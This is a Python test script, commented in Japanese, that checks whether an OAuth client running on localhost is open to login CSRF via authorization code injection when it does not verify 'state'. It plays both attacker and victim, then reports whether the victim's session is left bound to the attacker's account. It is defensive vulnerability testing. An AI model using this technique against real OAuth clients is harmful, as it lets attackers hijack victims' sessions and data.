"""
state 未実装による CSRF (認可コード注入) のテスト

攻撃シナリオ:
  1. 攻撃者が自分自身のアカウントで正規にログインし、自分の認可コードを取得する
  2. そのコードを仕込んだ /callback?code=... のURLを被害者に踏ませる
  3. クライアントが state を検証していなければ、被害者のセッションに
     「攻撃者のアカウント」のアクセストークンが紐づいてしまう

使い方:
    cd oauth/scripts
    AS_URL=http://localhost:4000 \
    CLIENT_URL=http://localhost:3000 \
    CLIENT_ID=fortune-app \
    CLIENT_SECRET=<.env の FORTUNE_APP_CLIENT_SECRET> \
    REDIRECT_URI=http://localhost:3000/callback \
    TEST_USERNAME=Bob \
    TEST_PASSWORD=<config.ts の Bob のパスワード> \
    python3 check_state_csrf.py
"""

import sys

import requests

from common import (
    CLIENT_URL,
    client_session_is_logged_in,
    login_and_get_code,
    report,
    summary,
)


def test_code_injection_without_state():
    # 0. 被害者役: 自分自身で /login を踏んでおく(= 普段どおりログインを開始した状態)。
    #    これでクライアント側のセッションに正規の state が積まれる。
    #    AS 側へのリダイレクトは追わない(被害者は実際にはログインを完了させない想定)。
    victim_session = requests.Session()
    victim_session.get(
        f"{CLIENT_URL}/login",
        params={"scope": "profile:basic"},
        allow_redirects=False,
    )

    # 1. 攻撃者役: 自分のアカウントで正規にログインして、認可コードを取得する
    #    (クライアントの /login は経由せず、AS に直接ログインするので state は持たない)
    attacker_code = login_and_get_code()
    if not attacker_code:
        report("state未検証による認可コード注入(CSRF)", False, "前提の認可コード取得に失敗")
        return

    # 2. 被害者役: state を持つセッションのまま、攻撃者の code(state なし)で
    #    callback URL にアクセスする
    resp = victim_session.get(
        f"{CLIENT_URL}/callback",
        params={"code": attacker_code},
        allow_redirects=True,
    )

    # 3. 被害者のセッションがログイン済み扱いになっていれば、
    #    「攻撃者のアカウント」のトークンを被害者に押し付けられたことになる
    vulnerable = client_session_is_logged_in(victim_session)
    report(
        "state未検証による認可コード注入(CSRF)",
        vulnerable,
        f"callback status={resp.status_code} victim_logged_in={vulnerable}",
    )


if __name__ == "__main__":
    print(f"=== state CSRF テスト against {CLIENT_URL} ===\n")
    test_code_injection_without_state()

    sys.exit(summary())
